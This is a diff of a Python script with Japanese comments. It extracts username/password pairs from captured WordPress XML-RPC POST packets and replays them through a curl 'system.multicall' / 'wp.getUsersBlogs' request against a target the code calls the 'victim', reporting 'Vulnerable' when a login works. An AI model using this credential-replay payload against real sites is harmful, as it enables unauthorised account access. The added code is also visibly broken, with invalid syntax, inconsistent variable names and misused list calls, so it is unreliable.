@@ -3,8 +3,9 @@ import subprocess
 import re
 import os.path
 
-#victimに対してpostTextの内容をcurlを使ってPostする
-def Curl_Victim(victim,postText):
+#victimに対してpostTextの内容をcurlを使ってPostする。UserPassには、User名とPasswordが一つずつ格納されている。
+def Curl_Victim(victim,UserPass[]):
+    postText="<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>"+UserPass[0]+"</string></value><value><string>"+UserPass[1]+"</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>"
     command = ["curl", "-D","-",victim,"-d",postText]
     res = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     #resはバイト列なので、可読な文字列に変換
@@ -44,6 +45,9 @@ def Output_UserPass(postText):
 if __name__=='__main__':
     args=sys.argv
     argCount=len(args)
+    postPacket=[]     #PacketのPostデータを格納
+    UserandPass={}    #UserがKey値、Passwordがリスト型の辞書型
+    UserList=[]　　　  #User名のみを格納するリスト（重複なし）
     if(args[1]=="-help"):
         print("Refer to the following format")
         print("python XMLRPC_Check.py \"text file with postData written\"   \"Victim\"")
@@ -53,24 +57,41 @@ if __name__=='__main__':
         print("python XMLRPC_Check.py \"text file with postData written\"   \"Victim\"")
         quit()
     # すべての内容を読み込む
-    allPostData = open(arts[1], "r")
+    allPostData = open(args[1], "r")
     allContents = allPostData.read()
     allPostData.close()
     #パケット単位でテキストを分ける。
     byPostData=allContents.split("POST")
+    for packet in byPostData:
+        packets=[]
+        #ヘッダ部分とPost部分でわける。
+        packets=packet.split("<?xml version="1.0"?>")
+        del packets[0]
+        postPacket.append(packets[1])
+        
+    #PostDataからUser名とPasswordを取り出す。User名をKey値、Passwordをリストとする辞書型で格納
+    for postData in postPacket:
+        tempUserandPass=Output_UserPass(postData)
+        #temUserPass[0]にはUser名、temUserPass[1]にはPasswordが格納されている。
+        #もしUserListにtemUserPass[0]が格納されているのなら、Key値がtemUserPass[0]のリストにPasswordをappendする
+        if tempUserPass[0] in UserList:
+            UserandPass(tempUserandPass[0],[].append(temUserandPass[1]))
+        else:
+            UserList.append(tempUserandPass[0])
+            UserandPass.setdefault(tempUserandPass[0],[]).append(temUserandPass[1])
+        
 
-    for ip in ipAddress:
-        print(ip)
-        ip=ip.replace('\n','')
-        whoisResult=subprocess.Popen(["whois",ip],stdout=subprocess.PIPE )
-        grep=subprocess.Popen(["grep","country\|Country\|Organization"],stdin=whoisResult.stdout, stdout=subprocess.PIPE)
-        whoisResult.stdout.close()
-        country=grep.communicate()[0]
-        file.write(ip)
-        file.write('\n')
-        file.write(country)
-        file.write('\n')
-        file.write('---------------------------------------------')
-        file.write('\n')
-    allPostData.close()
+    #User名とPasswordをもとにCurl処理。ログイン失敗しているなら脆弱性なしと出力され、成功したならVulnerableと出力される。
+    for user,pass in UserandPass:
+        for password in pass:
+            tempUsrPss.append[user]
+            tempUsrPss.append[password]
+            result=Curl_Victim(args[2],temUsrpss)
+            if result in "ユーザー名またはパスワードが正しくありません。":
+                print("脆弱性なし")
+            else:
+                print("Vulnerable")
+                print(tempUsrPss)
+                temUsrpss.clear()
+   
 
